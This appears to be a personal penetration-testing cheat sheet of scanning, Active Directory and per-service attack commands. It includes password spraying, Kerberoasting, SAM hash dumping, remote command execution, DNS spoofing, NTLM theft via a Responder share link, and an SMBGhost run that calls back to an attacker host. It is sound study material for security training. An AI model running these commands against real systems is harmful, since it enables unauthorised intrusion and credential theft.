# Enumeration

## Host Discovery

Given one or more IP addresses, we want to see which ones are alive:
Send ICMP echo requests, and see if they reply with `nmap`

```bash
sudo nmap [IP] -sn | grep for | cut -d" " -f5
```

This scanning method works only if the firewalls of the hosts allow it.

- IP format:
  - range  `nmap [IP_start/IP_end]`
  - host list: `nmap -iL FILE`
  - multiple IPs space separated
- `--reason` Displays why an host is alive
- `--packet-trace` Shows all packages sent and received

## Service scanning

The **TCP-SYN scan** (`-sS`), the default nmap scan, sends one packet with the  SYN flag and, therefore, never completes the three-way handshake. 
### **nmap options:**

- **General:**

  - `-sC` execute scripts

  - `-sV` show the versions

  - `--version-all` (Try every single probe to determine the version)   

  - `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.

  - `-Pn` disable the ICMP echo requests 

  - `-n` disable DNS resolution

  - `-A` aggressive scan

  - `--packet-trace` Shows all packages sent and received

  - `--version-trace` Show all version packages       


- **protocols:**

  - `-sU` performs UDP scan
  - `-sS` SYN Scan: default
  - `-sT` Connect scan: sends a  `SYN` packet -> the port is open if it answers with  `SYN-ACK` packet and closed with an `RST` packet. 
    - Less stealthy and slow than `-sS`, but highly accurate.
    - Useful when the target has a firewall that drops incoming packets but allows outgoing packets. 

  - `-sA` ACK scan: much harder to filter for firewalls and IDS/IPS systems because they only send a TCP packet with only the ACK flag. 

  - `-O`: Performs operation system detection scan.

- **Firewall / IDS usuful flags:**

  - change protocol
  - `-D RND:5` Generates five random IP addresses that indicates the source IP the connection comes from.
  - `-S` Scans the target by using different source IP address.
  - `-e [INTERFACE]` Sends all requests through the specified interface.
  - `--dns-server <ns>,<ns>`) to specify DNS servers. 
  - `--source-port 53` specify a source port  for our scans. 
  - `-T` specifies the timeing (`0` paranoid - `5` insane)

### nmap scripts
`nmap --script <script name> -p <port> <host>` to run other scripts.
  `--script "dns-* and discovery and not intrusive"` uses all the dns related scripts in the category discovery and not in the category intrusive. 
  
  Here all the categories:
  - `auth` Determination of authentication credentials.
  - `broadcast` Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` Default scripts executed by using the -sC option.
  - `discovery` Evaluation of accessible services.
  - `dos` These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` Scripts that use external services for further processing.
  - `fuzzer` This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` Intrusive scripts that could negatively affect the target system.
  - `malware` Checks if some malware infects the target system.
  - `safe` Defensive scripts that do not perform intrusive and destructive access.
  - `version` Extension for service detection.
  - `vuln` Identification of specific vulnerabilities.

### **nmap output**

- **`open`:** Connection to the scanned port has been established (TCP, UDP or SCTP) 

  - If the UDP port is `open`, we only get a response if the application is configured to do so.

- **`closed`:** 

  - For TCP, we got back a `RST` flag. 
  - In UDP, only if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed, otherwise is unreliable.

- **`filtered`:** Nmap cannot say if the port is open/closed, because:

  - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
  - A *firewall* reject the package: As a response, we could get one of the following error messages:
    - Net Unreachable
    - Net Prohibited
    - Host Unreachable
    - Host Prohibited
    - Port Unreachable
    - Proto Unreachable

- **`unfiltered`:** either *no response is returned* or an error code* is returned.

- **`open|filtered`:** a firewall or packet filter may protect the port.

  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered`.

- **`closed|filtered`:** impossible to determine if the scanned port is closed or filtered by a firewall.

- **`tcpwrapped`** the behavior of the port is consistent with one that is  protected by tcpwrapper, that is a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 

  tcpwrapper protects *programs*, not ports. This means that a valid (not false-positive) `tcpwrapped` response indicates a real network service is available, but you are not on the list of hosts allowed to talk with it. When such a large number  of ports are shown as `tcpwrapped`, it is unlikely that they represent real services, so the behavior probably means something else.

### Firewalls and IDS/IPS

Firewalls, intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are  software-based components. 
`IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. 
`IPS` complements `IDS` by taking specific defensive measures if an attack is detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.

Here some way to deal with them:

- **Change scanning protocol**
- **Change rate limit and intensity.** If this isn't improving the results, then it means that it is a firewall and not a IPS
- **Decoys:**
  With the option `-D`,  Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent, e.g. `-D RND:5` it sends 5 random ones.
- **IP ID manipulation:** 
  manually specify a different source IP address (using the `-S` and  `-e [interface (e.g. tun0)]` options ) from the ones in `ifconfig` to see if a different IP address (perhaps from a different subnet) gets better results.
- **DNS Proxying**

  - `--dns-server <ns>` to specify DNS servers, e.g. `1.1.1.1`. This method could be fundamental if we are in a demilitarized zone (`DMZ`). The company's DNS servers are usually more trusted than those from the  Internet. 

  - `--source-port 53` specifies the source port. If the administrator uses the firewall to control this  port and does not filter IDS/IPS properly, our TCP packets will be  trusted and passed through.

- If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.

## Version Fingerprinting

  - `-sV` and `--version-all` it is usually enough

  - `nmap -sV --script=banner <target>` 

  - manually: connect to the service using `nc`, grab the banner, and intercept the network traffic using `tcpdump`

    ```bash
    sudo tcpdump -i [eth0/tun0] host [YOUR_IP] and [IP_TO_LISTEN]
    ```

    ```bash
    sudo ncat -v [IP] [PORT] {--source-port }
    ```
    Note that if netcat times out, then you should just try more times.

# Active Directory

- AD Is a collection of domains, each can be divided into subdomains, the top-most domain is called "forest"
	- Every domain/subdomain has a "Domain Controller" (DC), the server on which port 88 (Kerberos) is deployed
	- Every domain is a collection of objects, each one having attributes and privileges stored in a LDAP database
		- Accounts (Users, Services, PC)
		- Groups
		- Organizational Units
		- GPOs
	- Every PC account, including the DC, has a username set to "[HOSTNAME]$" and a FQDN set to "[HOSTNAME].[DOMAIN]"
	- Every domain has two default accounts: "Administrator" and "krbtgt", becoming Administrator on the DC Server equals to domain takeover
	- Every PC in an AD will have its own "local users", but users in the same domain can potentially access every PC in that domain
- 
It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 

The goal is to get local admin on the domain controller. 

Port `88` is always open, since it hosts the DC, running a process called *Kerberos*. Kerberos is a way for users to authenticate in the network, even if they don't have an account for it.

There could be multiple DCs. A *trust escalation* is a privilege escalation in which you go from a DC to the other, if they trust each other. The trivial one is the one from child to parent. 

*Forest* is the parent of a collection of machines that has the same hierarchy.

1. `krbconf [DOMAIN] [DC_NETBIOS_NAME]`           â†’ [Add Multiple Domains](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)

2. Through anonymous or guest authentication, try to get access to

   - SMB

   - RPC

   - LDAP

3. Get a list of valid usernames:

   - `--users` in nxc for SMB and LDAP while authenticating

   - manually for RPC with `enumdomusers` and `querydispinfo`

   - rid-bruting over SMB

     ```bash
     nxc smb <IP> -u "" -p "" --rid-brute 10000
     ```

   - Kerberos brute-forcing over ldap

     - Generate users: `usergen() [FULL_NAMES.txt]` 

       Wordlists:[Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`

     - ```bash
       kerbrute userenum -d [DOMAIN] [USERS.txt] --dc [DC_IP]
       ```

4. Password spraying

   - Get password policy
     - smb: `nxc --pass-pol`
     - rpc `getdompwinfo`
   - nxc:
     - use `--continue-on-success` 
     - `--no-bruteforce` to try user user
     - test on all services

   

5. Get a session in WinRM

6. If you cannot, Kerberos Roasting: steal an hash

   ```bash
   GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
   ```

7. Dump and analyze the database

   ```bash
   neostart   # Open a Neo4J server
   bloodhound # Open the bloodhound GUI 
   bloodhound-python -u user -p pass -ns dc_ip --domain domain -c All --zip --dns-tcp
   ```

8. In bloodhound:

   9. Upload the ZIP file
   10. search for the user you compromised -> right click -> mark as owned
   11. Outbound Object Control: Check for every compromised user
   12. On the graph, right-click interesting edges and check the linux/windows abuse
   13. In Analysis -> Check All Shortest Paths / Dangerous Privileges / Kerberos Interactions
# Service Hacking

## Service Types

**Services:**

- Authentication protocols (ssh, telnet, rdp, smb, vnc) â†’ Find the credentials
- Read/Write (redis, ftp, tftp, smb, nfs, rsync, snmp, rpc, netbios, ldap)
- Database (redis, mysql, mssql, psql, mongodb, oracle-tns, whois)
- Network Access (squid, isakmp, irc, dns)
- E-mail (smtp, pop3, imap)

**Stacks (common ports)**

- 135, 139, 445 -> SMB
- 80, 8080, 8000, 8443, 3000 -> HTTP
- 88, 389, 5985 -> Active Directory
- 21, 2121 -> FTP
- 22, 2222 -> SSH
- 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo

## 21 - FTP

**Type:** Authentication, Read/Write

- Active vs Passive mode:

  In the `active` variant, if a  firewall protects the client, the server cannot reply because all  external connections are blocked., while in the `passive mode`, the firewall does not block the transfer.

- [List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)

### Interaction:

- `ftp [IP] -P [PORT]`

  - `cd`, `ls -la` , to navigate
  - `get` `put` to download/upload
  - `status` to check the settings
  - `LIST -R`, if the setting ls_recurse_enable=YES, this show all the content at once.
  - `debug`
  - `trace`

- Download all available files:

  ```bash
  wget -m --no-passive ftp://user:pass@10.129.14.136
  ```

- If TLS/SSl encryption is present, to get the certificate:

  ```bash
  openssl s_client -connect [IP] -starttls ftp
  ```


### Exploit:

- **File upload**
  - LFI
  - with web servers, it is common that files are synchronized
- **sniffing** with tcpdump 
- **Bounce attack**
  It is a way to get nmap access a local server (that you cannot scan with nmap) through an exposed ftp server

  ```bash
  nmap -Pn -v -n -p80 -b [user]:[pass]@[EXPOSED SERVER] [LOCAL SERVER]
  ```
### Server
#### CoreFTP

  Allows an HTTP `PUT` request, which we can use to write content to files. 

  ```bash
  curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
  ```

**vsFTPd Configuration**

- The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`
- Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
- `/etc/ftpusers` is used to deny certain users access to the FTP service.

## 23 - Telnet

It is a shell (old ssh)

-  nmap is enough for enumeration
- hydra to bruteforce
- To connect: `telnet [IP]`

## 22 - SSH

### Generalities

- **Type:** authentication

- Authentication protocol:

  1. Server Authentication:
     The server sends an encrypted certificate to the client 
  2. Client authentication:
     The client enters a password, which was saved as an encrypted hash by the server

- Authentication methods:
  - Password authentication
  - Public-key authentication
    The private key is stored on the user's own computer and secured with a passphrase. 
    PUTTY is Windows format, that can be converted in Linux with:
    `puttygen ssh_key_file -O private-openssh -o id_rsa`
  - Host-based authentication

  - Keyboard authentication
  
  - Challenge-response authentication
  
  - GSSAPI authentication
- The [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) file is in `/etc/ssh/sshd_config`

**Dangerous settings**

| **Setting**                  | **Description**                                              |
| ---------------------------- | ------------------------------------------------------------ |
| `PasswordAuthentication yes` | Allows password-based authentication. Allows to brute-force a known username for possible passwords. |
| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.                           |
| `PermitRootLogin yes`        | Allows to log in as the root user.                           |
| `Protocol 1`                 | Uses an outdated version of encryption.                      |
| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications.                  |
| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.                              |
| `PermitTunnel`               | Allows tunneling.                                            |
| `DebianBanner yes`           | Displays a specific banner when logging in.                  |

### Exploit

-  `SSH-1` is vulnerable to `MITM` attacks

### Interaction

````bash
./ssh-audit.py [IP]
````

For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.

```bash
ssh -v [USER]@[IP] -o PreferredAuthentications=[PASSWD]
```

### Privesc
- Check if there is a private key: `ls -laR /home | grep ssh`
  - `id_rsa`
  - `id_ed25519`
- Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`

  ```bash
  chmod 600 id_rsa	# More restrictive permission
  ssh root@10.10.10.10 -i id_rsa
  nano id_rsa	# open and copy on your machine
  ```

- Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`

	```bash
	# On Kali
	ssh-keygen -f key	
	cat key.pub        
	# On Target
	echo '[KEY.PUB]' > /home/[USER]/.ssh/authorized_keys
	# On Kali
	ssh user@IP -i key
	```

## 25, 465, 587 - SMTP

### Generalities:

**Type: ** Email sending
- Used with SSL/TLS encryption.
- Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable -> send spam en masse using arbitrary fake sender addresses (mail spoofing). 
- For this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP.

### Configuration

- `/etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"`

- Dangerous settings:

  - Open Relay Configuration

    `mynetworks = 0.0.0.0/0`

    With this setting, this SMTP server can send fake emails and thus  initialize communication between multiple parties. Another attack  possibility would be to spoof the email and read it.

### Interaction

- `telnet` list of response code [here](https://serversmtp.com/smtp-error/)

  - `AUTH PLAIN`  authenticate the client.
  - `HELO`  logs in with its computer name and thus starts the session.
  - `MAIL FROM`  names the email sender.
  - `RCPT TO`  names the email recipient.
  - `DATA`  initiates the transmission of the email.
  - `RSET`  aborts the initiated transmission but keeps the connection between client and server.
  - `VRFY`  checks if a mailbox is available for message transfer, can enumerate existing users on the system
  - `EXPN`  checks if a mailbox is available for messaging with this command. When used with a distribution list, it will list all users on that list.
  - `NOOP`  equests a response from the server to prevent disconnection due to time-out.
  - `QUIT`  terminates the session.

```bash
  telnet <ip> <port>     # Return the hostname of the machine
  # Basic interactions
  HELO <domain>
  EHLO <domain>
  VRFY root
  VRFY testuser
  # Sometimes we may have to work through a web proxy. 
  CONNECT <ip>:<port> HTTP/1.0
  # Send an email
  MAIL FROM: <[USER]@[DOMAIN]>
  RCPT TO: <[USER]@[DOMAIN]> NOTIFY=success,failure
  DATA
  ```

- `evolution` (GNOME Desktop)

- **User enumeration**

  ```bash
  smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
  ```

â€‹	To try with domain usually only for RCPT.

### Exploit

- **Open Relay** -> Phishing or spoofing

  Messaging servers that are accidentally or intentionally configured as  open relays allow mail from any source to be transparently re-routed  through the open relay server.

  1. `nmap smtp-open-relay` tests if an open relay is possible.
  2. Use any mail client to connect to the mail server and send our email.
     ```bash
     swaks --from [USER] --to [USER] --header '' --body '' --server [IP]
     ```
	- Notice that the user doesn't include the domain
## 53 - DNS

### Generalities:

- Purpose:
  - DNS servers translate domain names into IP addresses and thus control which server a user can reach via a  particular domain. 
  - It stores and outputs additional information about the services associated with a domain.
- Types of DNS Servers:
  - *DNS root server*
    responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. 
  - *Authoritative name server*
    hold authority for a particular zone. They only answer queries from their area of responsibility,
  - *Non-authoritative name server*
    they collect information on specific DNS zones
  - *Caching server*
    cache information from other name servers for a specified period. The  authoritative name server determines the duration of this storage.
  - *Forwarding server*
    forward DNS queries to another DNS server.
  - *Resolver*
    perform name resolution locally
- DNS records:
  - `A`  Returns an IPv4 address of the requested domain 
  - `AAAA`  Returns an IPv6 address of the requested domain.
  - `MX`  Returns the responsible mail servers 
  - `NS`  Returns the DNS servers (nameservers) of the domain.
  - `TXT`  Contains various information
  - `CNAME`  Serves as an alias for another domain name.
  - `PTR`  Converts IP addresses into valid domain names.
  - `SOA`  Provides information about the corresponding DNS zone and email address of the administrative contact.

**Configuration**

- *Local DNS configurations files*
  - [Bind9](https://www.isc.org/bind/) is often used on Linux
  - Different zones are defined here
  - The local conf files are usually:
    - `named.conf.local`
    - `named.conf.options`
    - `named.conf.log`
  - Dangerous settings:
    - `allow-query`  Defines which hosts are allowed to send requests to the DNS server.
    - `allow-recursion`  Defines which hosts are allowed to send recursive requests to the DNS server.
    - `allow-trnasfer`  Defines which hosts are allowed to receive zone transfers from the DNS server.
    - `zone-statistics`  Collects statistical data of zones.

- *zone files* `/etc/bind/db.domain.com`

  Text file that describes a DNS zone with the BIND file format. 

   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record for a domain to have zones. 

- *reverse name resolution files* `/etc/bind/db.10.129.14`

  The computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a `PTR` record., which are responsible for the reverse translation of IP addresses into names.

### Footprinting

- General info:
  ```bash
  # Get Domain name
  dig -x [IP] @IP
  # Name Servers
  dig ns [DOMAIN] @[IP]] {+short}
  # Version
  dig CH TXT version.bind [IP]
  # Available records
  dig ANY [DOMAIN] @[IP]
  ```
- **Zone Transfer**
  ```
	dig axfr [DOMAIN] @[IP]
  ```
  This should be done recursively on the new discovered domains.
  
  A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. One can try asking a DNS server for a copy of its zone information.

- **SubDomain Brute Forcing**
  -  [DNSenum](https://github.com/fwaeytens/dnsenum)
    ```bash
    dnsenum --dnsserver [IP] --enum -p 0 -s 0 -o subdomains.txt -f [WORDLIST] [DOMAIN]
    ```
  - Subbrute (more precise but slower)
    ```bash
    cd TOOLS/subbrute
    ./subbrute.py [DOMAIN] -s ./names.txt -r ip.txt
    ```

#### Exploit

- **Domain Takeover** (only public)

  Registering a non-existent domain name to gain control over another domain.

  ```bash
  host [SUBDOMAIN]
  ```
  
  If the domain name uses a CNAME record to another domain, which expired. In that case, anyone who registers to it will have complete control over the domain, until the DNS record is updated.
  
  After finding one, one can check it [here](https://github.com/EdOverflow/can-i-take-over-xyz)

- **DNS Spoofing**

  Altering DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. 

  1. Map in the `/etc/ettercap/etter.dns` file, the target domain to the attacker's IP
  2. Start `Ettercap` and scan for live hosts `Hosts > Scan for Hosts`. 
  3. Add the target IP address to Target1 and add a default gateway found in step 2. IP to Target2.
  4. Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`.
  5. if a victim user coming from the target machine visits the domain on a web browser, they will be redirected to a `Fake page` that is hosted on the attacker's IP address.

## 69u - TFTP

**Type: ** Read/write

Like FTP, but without needing authentication.

```
tftp
>
```

| **Commands** | **Description**                                              |
| ------------ | ------------------------------------------------------------ |
| `connect`    | Sets the remote host, and optionally the port, for file transfers. |
| `get`        | Transfers a file or set of files from the remote host to the local host. |
| `put`        | Transfers a file or set of files from the local host onto the remote host. |
| `quit`       | Exits tftp.                                                  |
| `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |

## 79 - Finger

**Finger** is a program you can use to find information about computer users. 

### Enumeration

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

Bruteforcing finger can reveal local users
## 88 Kerberos
### Enumeration
- Kerberos user brute-forcing
	 ```bash
	   kerbrute userenum -d [DOMAIN] [USERS.txt] --dc [DC_IP] -t 40
	   ```
	 - Generate users: `usergen() [FULL_NAMES.txt]` 
	- Wordlists: `statistically-likely-usernames/top-formats.txt`
- Password Spraying (only accepts one password)
  ```bash
	kerbrute passwordspray -d [DOMAIN] --dc [IP] valid_users.txt [PWD] -t 40
	```
### Exploit
- **KBR Roasting** (needs credentials)
  Checks the users that have an SPN and steal their hashes: so all of the enumerated users are service accounts, but if people are lazy, they could be also domain accounts.
	  - From Linux:
		  - `getUserSPNs`
		    ```bash
		    GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN/USER:PWD] -request
			```
		- `nxc`
		  ```bash
		  nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
		  ```
	- From Windows:
		- Rubeus
		  ```powershell
		    Invoke-Rubeus -Command "kerberoast /tgtdeleg /creduser:[DOMAIN]\[USER] /credpassword:[PASS] /format:hashcat /nowrap"
			```
		- Powerview
		  ```powershell
		  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
			```
	- Crack with `hashcat`, to clean the output (powerview output)
	  ```bash
	  cat hash.txt| tr -d '\n' | tr -d ' ' >t; mv t hash.txt
		```
- **ASREP Roasting** (needs usernames)
    - From Linux:
	    - `GetNPUsers`
	      ```bash
	      GetNPUsers.py [DOMAIN]/ -usersfile [VALID_USERS.txt] -request -format hashcat
			```
		- nxc with authentication
		  ```bash
		  nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
		  ```
		- nxc unauthenticated
			```bash
		    nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
		    ```
	- From Windows
	  - Rubeus
		  ```powershell
		  Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
			```
		- Powerview
		  ```powershell
		  Get-DomainUser -PreauthNotRequired -Verbose | select userprincipalname
		  Get-ASREPHash -Username [USER]
			```
## 110, 995 - POP3

### Generalities:

**Type:** Email receiving

- Purpose:
  - Access emails from a mail server
  - Allows online listing retrieving and deleting emails
  - Authentication to the desire mailbox
  - SSL/TLS to require an encrypted session (on the higher port if present)

### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

By default, `POP3` clients remove downloaded messages from the email server, while `IMAP` doesn't making the latter one more interesting. 

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'pop3s://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl:

  ```bash
openssl s_client -connect [IP]:pop3s
  ```

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |


## 111tu, 2049tu - NFS

**Type:** Reade/Write, Authentication only for v4

### Configuration

- `/etc/exports`
  - The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows the possible options of the file
  - First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet.
  - Possible options:
    - `rw`  Read and write permissions. 
      - Dangerous
    - `ro`  Read only permissions.
    - `sync`  Synchronous data transfer. (A bit slower)
    - `async`  Asynchronous data transfer. (A bit faster)
    - `secure`  Ports above 1024 will not be used.
    - `insecure`  Ports above 1024 will be used. 
      - Dangerous: users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
    - `no_subtree_check`  This option disables the checking of subdirectory trees.
    - `root_squash`  Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. 
      - Dangerous: if set, we cannot edit the `backup.sh` file even as root.
    - `nohide`  If another file system was mounted below an exported directory, this directory is exported by its own exports entry. 
      - Dangerous

### Navigation

- Show available Shares that can be mounted

  ```bash
  showmount -e [IP]
  ```

- Mount a Share

  ```bash
  mkdir nfs
  sudo mount -t nfs [IP]:/ ./nfs/ -o nolock
  cd nfs
  tree .
  ```

- List Content with UIDs & GUIDs

  ```bash
  ls -n mnt/nfs/
  ```

- Unmount

  ```bash
  sudo umount ./target-NFS
  ```


### Exploit:

- If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.

## 123u - NTP
- Syncs device clocks over networks

## 135 - WMI


- **Type:** Authentication (remote)

### Interaction

  ```
  wmiexec.py [USER]:"[PASSWD]"@[IP] "hostname"
  ```

## 135 593 RPC

### Interaction

  ```bash
  rcpclient -U "user" [IP] -c [RPC_COMMAND] # -U'%' to anonymous login
  ```

  - `enumdomains`  All domains 
  - `querydominfo`  Domain, server, and user information 
  - `enumdomusers`  Domain users, and their RID value
  - `queryuser <RID>`  Info about a user
  - `querydispinfo` Descriptions of users (could be some password in it)
  - `enumprinters`: Printers description
  - `getdompwinfo`: Password policy
#### User Enumeration
- Brute force the RIDs to get users
	- Impacket: `lookupsid.py user:pass@IP`
	- Manual:
	  ```bash
	for i in {1000..1050}; do rpcclient -U 'USER%PASS' IP -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done
	  ```
- Brute Forcing from list
  ```bash
	for u in $(cat valid_users.txt);do rpcclient -U "[USER]%[PWD]" -c "getusername;quit" [IP] | grep Authority; done
	```
## 137 - 139 NetBios
## 139 445 SMB

**Type:** Read/Write, Authentication

### Configuration

- `/etc/samba/smb.conf` to change settings
- Dangerous settings:
  - `browseable - yes`: Allow listing available shares in the current share

### Interaction
#### Linux
- General authentication: `nxc smb [IP] -u '' -p ''`
- Domain authentication: `nxc smb [IP] -u '' -p '' -d [DOMAIN]`
- Local authentication: `nxc smb [IP] -u '' -p '' --local-auth`
- NTLM hash: `nxc smb [IP] -u '' -p '' -H [HASH]`

  ```bash
	--users
	--rid-brute 10000                     # Gets Users by RID bruteforcing
  --shares	                              # List shares
   # Download all files - DONT TRUST IT
  -M spider_plus -o DOWNLOAD_FLAG=True   
  --pass-pol # Account Lockout Threshold=None -> brute forcing
  
  # ----------ACTIVE DIRECTORY----------
  -x 'whoami' --exec-method smbexec  # Run command
  --loggedon-users # Enumerating logged on Users
  --sam # Get SAM hashes (administrative privileges)
  ```

- `smbclient.py {domain/}username:password@<targetName or address>`  
    ```bash
    shares
    use <share>
    ls
    get <file>
    mget *
    ```
  
- `smbclient //[IP ADDRESS]{/FOLDER}`
    - `-N` anonymous access
    - `-U` specify user
    ```bash
	#Download all
	> mask ""
	> recurse
	> prompt
	> mget *
	```
  - `-L` display the list of shares (only to display without access!!)
    - `cd`, `ls`, and to download a file `get`.

    - `!<cmd>` to execute local system commands without interrupting the connection

    - `smbstatus` shows the version and who, from which host, and which share the client is connected

    - `psexec` to open a shell

- `mount` - Share is too large, string hunting
   ```bash
	smbmount IP -u user -p pass
	```

- `impacket`
  ```bash
    impacket-psexec [USER]:[PASS]@[IP]
    ```

#### Windows
  - cmd
    ```cmd
    net use n: \\192.168.220.129\Share /user:user pass
	copy [SRC_FILE] \\[HOST]\[SHARE]\[OUT_FILE
    ```

- `Powershell`

  ```powershell
    # Display share
    Get-ChildItem \\192.168.220.129\share\
    
    # Connect with Anonymous
    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem"
    
    # Connect with credentials
    $username = 'plaintext'
    $password = 'Password123'
    $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem" -Credential $cred
    ```
#### AD
1. Find the shares:
   ```powershell
   Find-DomainShare -CheckShareAccess
	```
2. Scrape the passwords in multiple shares with [Snaffler](https://github.com/SnaffCon/Snaffler):
	- All shares: `Snaffler.exe -s -d [DOMAIN] -o snaffler.log -v data`
	- one share: `Snaffler.exe -s -i \\[HOST]\[SHARE]`
	- [PowerHunt](https://github.com/NetSPI/PowerHuntShares): `Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public` 
### Exploit

- **EternalBlue:** anything that uses SMBv1 is at risk

- **LLMNR**

  1. Passive: open `responder` and wait
  2. Check if there are logged on users:
     ```bash
	   nxc smb [IP] --loggedon-users
	   ```
  3. Open malicious SMB share with `respond()` or on Windows with [Inveigh](https://github.com/Kevin-Robertson/Inveigh): `Invoke-Inveigh -NBNS Y -mDNS Y -ConsoleOutput Y -SMB Y`

  4. Find a way for users to open the malicious share link: `\\[RESPONDER_IP]\x`

  	- Web / SMTP Phishing
  
  		- Send the direct link to a user
  		- Send a malicious document to a user: `Bad-PDF`, `Bad-ODT`, [Office](https://github.com/Greenwolf/ntlm_theft)

  	- Drop malicious files generated with `ntlmtheft() [RESPONDER_IP]` in any writable SMB share you find

  	- Any web exploits for which you can trigger a request to `\\[RESPONDER_IP]\x`
- **nxc checkable exploit**
  ```bash
  nxc smb [DC_IP] [AUTH_STRING] -M ms17-010 -M smbghost -M zerologon -M nopac -M printnightmare
	```
	- [Eternal Blue](https://github.com/3ndG4me/AutoBlue-MS17-010)
	    - `use exploit/windows/smb/ms17_010_psexec`
	    -  Try offline payloads
	- [SMBGhost](https://github.com/Barriuso/SMBGhost_AutomateExploitation)
	    - `Smb_Ghost.py -i [IP] --check -e --lhost [KALI_IP] --lport [KALI_PORT] --arch [x86/x64]`
	- [ZeroLogon](https://github.com/dirkjanm/CVE-2020-1472?tab=readme-ov-file)
